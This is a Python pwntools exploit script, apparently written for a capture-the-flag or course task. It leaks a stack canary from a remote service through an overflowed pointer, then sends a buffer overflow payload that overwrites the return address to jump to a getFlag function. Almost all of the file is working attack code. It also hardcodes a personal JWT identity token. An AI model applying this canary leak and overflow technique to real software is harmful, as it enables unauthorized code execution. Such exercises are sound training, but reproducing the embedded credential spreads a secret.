#!/usr/bin/env python3
# find_canary_fast.py
# Usage: python3 find_canary_fast.py
#
# Strategy:
# 1) connect and handshake
# 2) scan a limited window under HIGH for an 8-byte qword == 100 (line_no)
# 3) once found, scan nearby memory for a qword equal to that found address (this is locals.line_pointer)
# 4) compute buffer_addr = ptr_addr - 32, canary_addr = buffer_addr + 0x30
# 5) read canary_addr and print hex

from pwn import remote, context, log
from ctf_helper import *
import struct
import time

id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here

stack_top = 0x7fffffffefff

io: tube = start(7004)
read_welcome(id_token)
io.recvuntil(b' ')
io.recvline()
elf = ELF("./task-4")
flag = elf.functions.getFlag
flagA = 0x4014e5 + 5
print("flag= ", flag)
lines = []
# i = 263
i = 260
address = stack_top - (i * 0x08)

for i in range(257, 263):
    io.sendline(cyclic(32) + p64(stack_top - i * 0x08))
    line = io.recvuntil(b' ', drop=True).strip()
    lines.append(int(line))

for i in lines:
    s = i.to_bytes(8, 'little').decode('ascii', errors='backslashreplace')
    print(f"{s}")

canary_int = (lines[0])
print("canary found: ", hex(canary_int), "ascii: ", canary_int.to_bytes(
    8, 'little').decode('ascii', errors='backslashreplace'))

payload = b"A" * 32
payload += p64(address - 10)  # overflow pointer
payload += p64(canary_int)  # overflow canary
payload += b"A" * 8
payload += p64(flagA)

io.sendline(payload)
io.recvuntil(b' ')
io.sendline("\n")
io.interactive()
